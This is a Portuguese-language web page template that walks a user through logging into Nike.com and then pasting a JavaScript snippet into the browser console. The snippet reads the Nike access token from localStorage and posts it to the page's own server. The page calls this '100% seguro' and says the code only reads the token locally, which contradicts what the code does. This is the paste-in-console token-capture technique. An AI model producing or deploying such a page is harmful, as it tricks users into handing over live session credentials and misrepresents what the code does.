Processo automático em 3 passos

1 Faça Login no Nike.com

Clique no botão abaixo para fazer login no Nike.com em uma nova aba:

Abrir Nike.com

Use o mesmo email e senha da sua conta Nike

2 Execute o Código Automático

Após fazer login no Nike, cole e execute este código no Console:

Como abrir o Console:

  • Windows/Linux: Pressione F12 ou Ctrl+Shift+J
  • Mac: Pressione Cmd+Option+J

⚠️ Cole o código abaixo e pressione Enter

// Código de captura automática do token Nike (function() { const token = localStorage.getItem('access_token'); if (!token) { alert('❌ Faça login no Nike primeiro!'); return; } fetch('{{ request.url_root }}nike/callback', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({token: token}) }) .then(r => r.json()) .then(d => { if (d.success) { alert('✅ Nike conectado com sucesso! Pode fechar essa aba.'); window.close(); } else { alert('❌ Erro: ' + (d.error || 'Desconhecido')); } }) .catch(e => alert('❌ Erro: ' + e)); })();

100% seguro - o código apenas lê o token local
